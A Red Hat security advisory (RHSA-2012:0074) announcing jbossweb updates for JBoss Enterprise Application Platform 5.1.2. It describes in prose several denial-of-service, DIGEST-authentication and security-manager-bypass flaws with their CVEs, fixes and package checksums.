=== Content from rhn.redhat.com_2d7adef5_20250125_074713.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2012:0074 - Security Advisory

Issued:
2012-01-31
Updated:
2012-01-31
# RHSA-2012:0074 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: jbossweb security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2012%3A0074)

## Topic

Updated jbossweb packages that fix multiple security issues are now
available for JBoss Enterprise Application Platform 5.1.2 for Red Hat
Enterprise Linux 4, 5, and 6.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

JBoss Web is the web container, based on Apache Tomcat, in JBoss Enterprise
Application Platform. It provides a single deployment platform for the
JavaServer Pages (JSP) and Java Servlet technologies.

A flaw was found in the way JBoss Web handled UTF-8 surrogate pair
characters. If JBoss Web was hosting an application with UTF-8 character
encoding enabled, or that included user-supplied UTF-8 strings in a
response, a remote attacker could use this flaw to cause a denial of
service (infinite loop) on the JBoss Web server. (CVE-2011-4610)

It was found that the Java hashCode() method implementation was
susceptible to predictable hash collisions. A remote attacker could use
this flaw to cause JBoss Web to use an excessive amount of CPU time by
sending an HTTP request with a large number of parameters whose names map
to the same hash value. This update introduces a limit on the number of
parameters and headers processed per request to mitigate this issue. The
default limit is 512 for parameters and 128 for headers. These defaults
can be changed by setting the
org.apache.tomcat.util.http.Parameters.MAX\_COUNT and
org.apache.tomcat.util.http.MimeHeaders.MAX\_COUNT system properties in
"jboss-as/server/[PROFILE]/deploy/properties-service.xml". (CVE-2011-4858)

It was found that JBoss Web did not handle large numbers of parameters and
large parameter values efficiently. A remote attacker could make a JBoss
Web server use an excessive amount of CPU time by sending an HTTP request
containing a large number of parameters or large parameter values. This
update introduces limits on the number of parameters and headers processed
per request to address this issue. Refer to the CVE-2011-4858 description
for information about the org.apache.tomcat.util.http.Parameters.MAX\_COUNT
and org.apache.tomcat.util.http.MimeHeaders.MAX\_COUNT system properties.
(CVE-2012-0022)

Multiple flaws were found in the way JBoss Web handled HTTP DIGEST
authentication. These flaws weakened the JBoss Web HTTP DIGEST
authentication implementation, subjecting it to some of the weaknesses of
HTTP BASIC authentication, for example, allowing remote attackers to
perform session replay attacks. (CVE-2011-1184, CVE-2011-5062,
CVE-2011-5063, CVE-2011-5064)

A flaw was found in the way JBoss Web handled sendfile request attributes
when using the HTTP APR (Apache Portable Runtime) or NIO (Non-Blocking I/O)
connector. A malicious web application running on a JBoss Web instance
could use this flaw to bypass security manager restrictions and gain access
to files it would otherwise be unable to access, or possibly terminate the
Java Virtual Machine (JVM). (CVE-2011-2526)

Red Hat would like to thank NTT OSSC for reporting CVE-2011-4610; oCERT for
reporting CVE-2011-4858; and the Apache Tomcat project for reporting
CVE-2011-2526. oCERT acknowledges Julian Wälde and Alexander Klink as the
original reporters of CVE-2011-4858.

Warning: Before applying this update, back up your JBoss Enterprise
Application Platform's "jboss-as/server/[PROFILE]/deploy/" directory, along
with all other customized configuration files.

Users of JBoss Enterprise Application Platform 5.1.2 on Red Hat Enterprise
Linux 4, 5, and 6 should upgrade to these updated packages, which correct
these issues. The JBoss server process must be restarted for this update to
take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/kb/docs/DOC-11259>

## Affected Products

* JBoss Enterprise Application Platform from RHUI 5 x86\_64
* JBoss Enterprise Application Platform from RHUI 5 i386
* JBoss Enterprise Application Platform 5 for RHEL 6 x86\_64
* JBoss Enterprise Application Platform 5 for RHEL 6 i386
* JBoss Enterprise Application Platform 5 for RHEL 5 x86\_64
* JBoss Enterprise Application Platform 5 for RHEL 5 i386

## Fixes

* [BZ - 720948](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=720948)
  - CVE-2011-2526 tomcat: security manager restrictions bypass
* [BZ - 741401](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=741401)
  - CVE-2011-1184 CVE-2011-5062 CVE-2011-5063 CVE-2011-5064 tomcat: Multiple weaknesses in HTTP DIGEST authentication
* [BZ - 750521](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=750521)
  - CVE-2011-4858 tomcat: hash table collisions CPU usage DoS (oCERT-2011-003)
* [BZ - 767871](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=767871)
  - CVE-2011-4610 JBoss Web remote denial of service when surrogate pair character is placed at buffer boundary
* [BZ - 783359](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=783359)
  - CVE-2012-0022 tomcat: large number of parameters DoS

## CVEs

* [CVE-2011-2526](https://www.redhat.com/security/data/cve/CVE-2011-2526.html)
* [CVE-2011-1184](https://www.redhat.com/security/data/cve/CVE-2011-1184.html)
* [CVE-2011-5062](https://www.redhat.com/security/data/cve/CVE-2011-5062.html)
* [CVE-2011-5063](https://www.redhat.com/security/data/cve/CVE-2011-5063.html)
* [CVE-2011-5064](https://www.redhat.com/security/data/cve/CVE-2011-5064.html)
* [CVE-2011-4858](https://www.redhat.com/security/data/cve/CVE-2011-4858.html)
* [CVE-2012-0022](https://www.redhat.com/security/data/cve/CVE-2012-0022.html)
* [CVE-2011-4610](https://www.redhat.com/security/data/cve/CVE-2011-4610.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## JBoss Enterprise Application Platform from RHUI 5

| SRPM | |
| --- | --- |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.src.rpm | SHA-256: 02837b3ef486c630e1723cc7e8aa48ffe4dfe094c57dec612ce2b72707470408 |
| x86\_64 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 7b497fcf857859cf3273b04629753c0b436eac12e2d69ae97368116472a70258 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: f69b9eaae904040a5e321a480c0a43b8f9acf830230deb1335eb3079c19e974c |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 45f383f8230b5c560414ddb30a72f364f47d29686a5de015316ca75c5e031a16 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: fe8581b16d2957dfe8c0156ca73c09963c7740165be14fc85ed9b7b725180eb1 |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 2a0a2c6b2b5fc3c28f6a09ea3d9bb3f70667214fc527e46d1e7518b1e61680d4 |
| i386 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 7b497fcf857859cf3273b04629753c0b436eac12e2d69ae97368116472a70258 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: f69b9eaae904040a5e321a480c0a43b8f9acf830230deb1335eb3079c19e974c |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 45f383f8230b5c560414ddb30a72f364f47d29686a5de015316ca75c5e031a16 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: fe8581b16d2957dfe8c0156ca73c09963c7740165be14fc85ed9b7b725180eb1 |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 2a0a2c6b2b5fc3c28f6a09ea3d9bb3f70667214fc527e46d1e7518b1e61680d4 |

## JBoss Enterprise Application Platform 5 for RHEL 6

| SRPM | |
| --- | --- |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.src.rpm | SHA-256: 02837b3ef486c630e1723cc7e8aa48ffe4dfe094c57dec612ce2b72707470408 |
| x86\_64 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 7b497fcf857859cf3273b04629753c0b436eac12e2d69ae97368116472a70258 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: f69b9eaae904040a5e321a480c0a43b8f9acf830230deb1335eb3079c19e974c |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 45f383f8230b5c560414ddb30a72f364f47d29686a5de015316ca75c5e031a16 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: fe8581b16d2957dfe8c0156ca73c09963c7740165be14fc85ed9b7b725180eb1 |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 2a0a2c6b2b5fc3c28f6a09ea3d9bb3f70667214fc527e46d1e7518b1e61680d4 |
| i386 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 7b497fcf857859cf3273b04629753c0b436eac12e2d69ae97368116472a70258 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: f69b9eaae904040a5e321a480c0a43b8f9acf830230deb1335eb3079c19e974c |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 45f383f8230b5c560414ddb30a72f364f47d29686a5de015316ca75c5e031a16 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: fe8581b16d2957dfe8c0156ca73c09963c7740165be14fc85ed9b7b725180eb1 |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 2a0a2c6b2b5fc3c28f6a09ea3d9bb3f70667214fc527e46d1e7518b1e61680d4 |

## JBoss Enterprise Application Platform 5 for RHEL 5

| SRPM | |
| --- | --- |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el5.src.rpm | SHA-256: df0e46a253dc62f1164db156421b5f02bc68efe670c51a2edb9a94afa9a1ec2e |
| x86\_64 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5b903505bbfe64819523a89dc9d3618965e2bfb52721eac4dc641cde7242e4f7 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: b8874354ee671cdb4eacb842e0a19bcdeb5e51b365fbde25a146fbe79d88593a |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5d925158f601181f540dbbc8e1734318b7d52dfe12cb0fadafdfe44c354fc462 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 07022a7c9aa808afc7e941df30b989bde0c31fd072b2b938b522d09d9836756c |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 3223f0c73940b79e4476ba2beb793ede223e82abea9779a75799f64611154b6e |
| i386 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5b903505bbfe64819523a89dc9d3618965e2bfb52721eac4dc641cde7242e4f7 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: b8874354ee671cdb4eacb842e0a19bcdeb5e51b365fbde25a146fbe79d88593a |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5d925158f601181f540dbbc8e1734318b7d52dfe12cb0fadafdfe44c354fc462 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 07022a7c9aa808afc7e941df30b989bde0c31fd072b2b938b522d09d9836756c |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 3223f0c73940b79e4476ba2beb793ede223e82abea9779a75799f64611154b6e |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_7eb90569_20250126_072109.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
